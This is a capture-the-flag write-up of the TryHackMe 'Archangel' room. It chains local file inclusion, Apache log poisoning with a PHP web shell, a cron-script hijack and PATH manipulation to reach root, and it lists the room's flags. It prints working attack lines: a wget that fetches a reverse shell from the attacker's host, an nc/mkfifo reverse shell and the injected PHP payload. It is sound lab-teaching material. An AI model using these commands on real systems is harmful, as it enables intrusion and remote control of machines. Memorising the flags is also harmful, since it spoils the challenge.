# Archangel CTF Writeup

## Difficulty: Easy
## Platform: TryHackMe

## Executive Summary

This report details the penetration testing walkthrough for the "Archangel" room on TryHackMe. The challenge involves exploiting a vulnerable web application to gain initial access, followed by privilege escalation to root. Key vulnerabilities include Local File Inclusion (LFI), Log Poisoning for Remote Code Execution (RCE), and path variable manipulation for privilege escalation.


## Methodology

The assessment followed a standard penetration testing methodology:
1. Reconnaissance
2. Enumeration
3. Exploitation
4. Privilege Escalation
5. Reporting

Tools used include Nmap, Gobuster, Burp Suite, Netcat, and standard Linux utilities.

## Reconnaissance

### Step 1: Port Scanning with Nmap

Performed an initial port scan to identify open services on the target IP (10.201.124.88).

```bash
nmap -sC -sV 10.201.124.88 -oN nmap_report
```

**Results:**
- Port 22: OpenSSH 7.6p1 Ubuntu
- Port 80: Apache httpd 2.4.29 (Ubuntu)

### Step 2: Host Discovery

Added the target IP to `/etc/hosts` to resolve the domain `mafialive.thm`.

```bash
sudo nano /etc/hosts
# Add the following line:
10.201.124.88   mafialive.thm
```

Browsed to `http://mafialive.thm` and discovered the first flag in the page source.

**Flag:** thm{f0und_th3_r1ght_h0st_n4m3}

## Enumeration

### Step 3: Directory Brute-Forcing with Gobuster

Used Gobuster to enumerate directories and files on the web server.

```bash
gobuster dir -u http://mafialive.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x php,txt — threads 50 -o gobuster.out
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/test.php             (Status: 200) [Size: 286]
/robots.txt           (Status: 200) [Size: 34]
```

**Key Findings:**
- `/test.php` (Status: 200)
- `/robots.txt` (Status: 200)

### Step 4: Web Application Analysis

- Visited `http://mafialive.thm/test.php`: Displayed a test page with a button linking to another PHP file.
- Checked `http://mafialive.thm/robots.txt`: Disallowed `/test.php`.

## Exploitation

### Step 5: Exploiting Local File Inclusion (LFI)

Intercepted the request to `/test.php` using Burp Suite. Modified the `view` parameter to exploit LFI and read the source code of `test.php`.

Request:
```
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mafialive.thm/test.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Decoded the base64 response to reveal the PHP source code, which included:
- A flag: thm{explo1t1ng_lf1}
- Logic allowing inclusion of files in `/var/www/html/development_testing` but preventing directory traversal.

### Step 6: Log Poisoning for Remote Code Execution (RCE)

Poisoned the Apache access log by modifying the User-Agent in Burp Suite to inject PHP code.

Modified User-Agent:
```
<?php system($_GET['cmd']); ?>
```

Accessed the log file via LFI to execute commands.

```bash
# Download reverse shell script
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=wget http://10.9.1.253:8000/revshell.php

# Execute the reverse shell
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=php%20revshell.php
```

Set up a listener on the attacking machine:

```bash
nc -lvnp 4444
```

Gained a reverse shell as `www-data`.

Upgraded to a full TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Flag:** thm{lf1_t0_rc3_1s_tr1cky}

## Privilege Escalation

### Step 7: Horizontal Privilege Escalation to User 'archangel'

Enumerated user files:

```bash
ls /home
# Output: archangel

ls /home/archangel
# Output: myfiles secret user.txt

cat /home/archangel/user.txt
# Flag: thm{lf1_t0_rc3_1s_tr1cky}
```

Found a script owned by 'archangel':

```bash
find / -user archangel -type f 2>/dev/null | grep -v /proc
# Output: /opt/helloworld.sh

cat /opt/helloworld.sh
# Content: #!/bin/bash
# echo "hello world" >> /opt/backupfiles/helloworld.txt
```

Modified the script to inject a reverse shell payload:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.253 4444 >/tmp/f" > helloworld.sh
```

Waited for the cron job to execute, gaining a shell as 'archangel'.

Upgraded TTY and accessed user files:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

cd secret
ls
# Output: backup user2.txt

cat user2.txt
# Flag: thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
```

### Step 8: Vertical Privilege Escalation to Root

Identified a backup script in `~/secret/backup` that runs with elevated privileges.

Exploited PATH variable manipulation:

```bash
cd /tmp
echo '/bin/bash -p' > cp
chmod 777 cp
export PATH=/tmp:$PATH

cd ~/secret
./backup
```

Gained root shell.

Accessed root flag:

```bash
cd /root
ls
# Output: root.txt

cat root.txt
# Flag: thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```

## Conclusion

The Archangel CTF challenge demonstrated common web vulnerabilities and privilege escalation techniques. Key takeaways include the importance of input validation to prevent LFI, secure logging practices to avoid log poisoning, and proper PATH handling in scripts. This walkthrough provides a step-by-step guide for replicating the exploit chain.
